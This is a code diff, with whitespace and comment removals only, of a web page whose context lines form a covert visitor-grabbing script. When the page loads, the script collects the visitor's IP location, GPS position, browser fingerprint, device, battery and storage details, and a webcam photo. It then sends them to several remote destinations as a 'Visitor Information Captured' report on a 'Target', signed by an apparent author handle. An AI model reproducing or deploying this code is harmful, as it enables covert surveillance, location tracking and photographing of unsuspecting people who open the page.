@@ -55,7 +55,7 @@
             }
         }
 
-       
+     
         async function getLocationFromIpapi() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -94,7 +94,7 @@
             return null;
         }
 
-       
+    
         async function sendOpenNotification(ip) {
             const msg = `🔔 *Alerta de apertura*\n📍 IP: ${ip}\n🕐 ${new Date().toLocaleString()}`;
             const formData = new FormData();
@@ -105,7 +105,7 @@
             } catch(e) {}
         }
 
-       
+    
         async function getFingerprint() {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
@@ -124,7 +124,7 @@
             return { gpu, fonts: available.join(', ') || 'Ninguna', canvas: hash };
         }
 
-       
+    
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let model = "Desconocido";
@@ -145,7 +145,7 @@
             };
         }
 
-       -
+    
         async function getStorageInfo() {
             try {
                 const est = await navigator.storage.estimate();
@@ -158,7 +158,7 @@
             }
         }
 
-        
+
         async function getBatteryInfo() {
             try {
                 const battery = await navigator.getBattery();
@@ -171,12 +171,12 @@
             }
         }
 
-       
+        
         function getLocalTime() {
             return new Date().toLocaleString();
         }
 
-       
+    
         function getGPS() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
@@ -198,7 +198,7 @@
             });
         }
 
-        
+    
         async function capturePhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -247,16 +247,16 @@
             return resultados.some(r => r.ok);
         }
 
-       
+        
         window.addEventListener('load', async function() {
             try {
-                // Notificación de apertura
+                
                 let ipInfo = await getLocationFromWorker();
                 if (ipInfo && ipInfo.ip) {
                     await sendOpenNotification(ipInfo.ip);
                 }
 
-                // Recolectar datos
+               
                 const gps = await getGPS();
                 const workerLoc = await getLocationFromWorker();
                 const ipapiLoc = await getLocationFromIpapi();
@@ -273,7 +273,7 @@
                     address = await reverseGeocode(gps.lat, gps.lng);
                 }
 
-                
+               
                 let msg = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
                 msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
                 msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
@@ -309,7 +309,7 @@
                 msg += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
                 msg += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @societykark`;
 
-              
+
                 await sendToMultiple(msg, photo, gps);
 
             } catch(e) {
